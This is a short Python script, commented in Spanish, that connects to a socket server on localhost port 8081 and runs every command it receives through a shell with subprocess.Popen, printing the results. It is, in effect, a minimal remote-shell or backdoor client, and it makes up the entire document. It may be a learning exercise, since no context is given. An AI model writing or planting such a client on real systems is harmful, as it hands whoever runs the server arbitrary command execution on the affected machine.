import socket
import subprocess

cliente = socket.socket()

try:
    # Nos conectamos al servidor
    cliente.connect(("localhost", 8081))
    
    # Enviamos el mensaje con valor 1, codificado
    cliente.send("1".encode("ascii"))
    
    while True:
        # Comando en bytes, que se envía al servidor
        comandoBytes = cliente.recv(1024)
        
        # Comando decodificado
        comandoDecodificado = comandoBytes.decode("utf-8")
        
        # Ejecutar el comando shell
        comando = subprocess.Popen(
            comandoDecodificado,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Leer la salida del comando línea por línea
        for linea in comando.stdout:
            print(linea)
        
        # Leer la salida de errores, si la hay
        for linea in comando.stderr:
            print(linea)
        
except Exception as e:
    raise e
